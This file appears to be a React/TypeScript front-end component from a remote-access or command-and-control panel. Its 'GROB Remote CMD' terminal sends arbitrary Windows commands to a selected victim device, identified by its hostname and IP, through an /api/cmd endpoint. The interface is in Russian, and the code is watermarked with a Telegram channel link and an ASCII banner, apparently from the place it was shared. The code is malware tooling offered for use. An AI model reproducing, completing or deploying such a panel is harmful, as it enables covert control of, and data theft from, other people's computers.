// t.me/SentinelLinks

"use client"

import { useState, useRef, useEffect } from "react"
import { Terminal, Send, Trash2, Loader2 } from "lucide-react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import type { User } from "@/app/page"
import { toast } from "sonner"

interface RemoteCmdTabProps {
  selectedUser: User
}

type CommandHistory = {
  command: string
  output: string
  timestamp: string
  status: "pending" | "success" | "error"
}

export function RemoteCmdTab({ selectedUser }: RemoteCmdTabProps) {
  const [command, setCommand] = useState("")
  const [history, setHistory] = useState<CommandHistory[]>([])
  const [isExecuting, setIsExecuting] = useState(false)
  const terminalRef = useRef<HTMLDivElement>(null)
  const pollingRef = useRef<NodeJS.Timeout | null>(null)

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight
    }
  }, [history])

  useEffect(() => {
    return () => {
      if (pollingRef.current) {
        clearInterval(pollingRef.current)
      }
    }
  }, [])

  const executeCommand = async () => {
    if (!command.trim() || isExecuting) return

    setIsExecuting(true)
    const timestamp = new Date().toLocaleTimeString("ru-RU")
    const currentCommand = command

// t.me/SentinelLinks
    const historyId = Date.now()
    setHistory((prev) => [
      ...prev,
      {
        command: currentCommand,
        output: "Выполнение команды...",
        timestamp,
        status: "pending",
      },
    ])

    setCommand("")

    try {
      const response = await fetch("/api/cmd", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          deviceId: selectedUser.id,
          command: currentCommand,
        }),
      })

      const data = await response.json()

      setHistory((prev) =>
        prev.map((entry) =>
          entry.command === currentCommand && entry.status === "pending"
            ? {
                ...entry,
                output: data.output || data.error || "Нет вывода",
                status: response.ok ? "success" : "error",
              }
            : entry,
        ),
      )

      if (response.ok) {
        toast.success("Команда выполнена")
      } else {
        toast.error("Ошибка выполнения команды", {
          description: data.error || "Не удалось выполнить команду",
        })
      }
    } catch (error) {
      console.error("Command execution error:", error)

      setHistory((prev) =>
        prev.map((entry) =>
          entry.command === currentCommand && entry.status === "pending"
            ? {
                ...entry,
                output: "ERROR: Сервер недоступен. Проверьте подключение.",
                status: "error",
              }
            : entry,
        ),
      )

      toast.error("Ошибка подключения", {
        description: "Сервер недоступен",
      })
    } finally {
      setIsExecuting(false)
    }
  }

  const clearHistory = () => {
    setHistory([])
    toast.info("История очищена")
  }

  return (
    <div className="flex-1 p-6 overflow-auto">
      <Card className="border shadow-lg h-full flex flex-col">
        <CardHeader className="pb-3">
          <CardTitle className="flex items-center gap-2 text-base">
            <Terminal className="w-4 h-4" />
            Remote Terminal
          </CardTitle>
        </CardHeader>
        <CardContent className="flex-1 flex flex-col gap-3">
          <div
            ref={terminalRef}
            className="flex-1 bg-black rounded-md p-3 font-mono text-xs overflow-auto min-h-[400px]"
          >
            <div className="text-green-400 mb-2 font-semibold">
              GROB Remote CMD v1.0 - Connected to {selectedUser.name}
            </div>
            <div className="text-green-400 mb-3">
              {selectedUser.hostname} ({selectedUser.ip})
            </div>

            {history.map((entry, index) => (
              <div key={index} className="mb-3">
                <div className="text-blue-400">
                  C:\Users\{selectedUser.hostname}
                  {">"} <span className="text-white">{entry.command}</span>
                </div>
                {entry.status === "pending" ? (
                  <div className="flex items-center gap-2 text-yellow-400 ml-4 mt-1">
                    <Loader2 className="w-3 h-3 animate-spin" />
                    <span>Выполнение команды...</span>
                  </div>
                ) : (
                  <div
                    className={`whitespace-pre-wrap ml-4 mt-1 leading-relaxed ${
                      entry.status === "error" ? "text-red-400" : "text-gray-300"
                    }`}
                  >
                    {entry.output}
                  </div>
                )}
                <div className="text-gray-600 text-[10px] mt-1">[{entry.timestamp}]</div>
              </div>
            ))}

            {history.length === 0 && (
              <div className="text-gray-500">Enter a command below to execute on the remote device...</div>
            )}
          </div>

          <div className="flex gap-2">
            <div className="flex-1 relative">
              <span className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground font-mono text-xs">
                C:\{">"}
              </span>
              <Input
                value={command}
                onChange={(e) => setCommand(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && executeCommand()}
                placeholder="Enter command (dir, ipconfig, whoami, systeminfo...)"
                className="font-mono pl-12 h-9 text-xs"
                disabled={isExecuting}
              />
            </div>
            <Button onClick={executeCommand} size="sm" className="h-9 px-4" disabled={isExecuting}>
              {isExecuting ? <Loader2 className="w-3 h-3 mr-1.5 animate-spin" /> : <Send className="w-3 h-3 mr-1.5" />}
              <span className="text-xs">Execute</span>
            </Button>
            <Button onClick={clearHistory} variant="outline" size="icon" className="h-9 w-9 bg-transparent">
              <Trash2 className="w-3 h-3" />
            </Button>
          </div>

// t.me/SentinelLinks
          <div className="text-[10px] text-muted-foreground">
            <strong>Supported commands:</strong> dir, ipconfig, whoami, systeminfo and other standard CMD commands
          </div>
        </CardContent>
      </Card>
    </div>
  )
}

//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
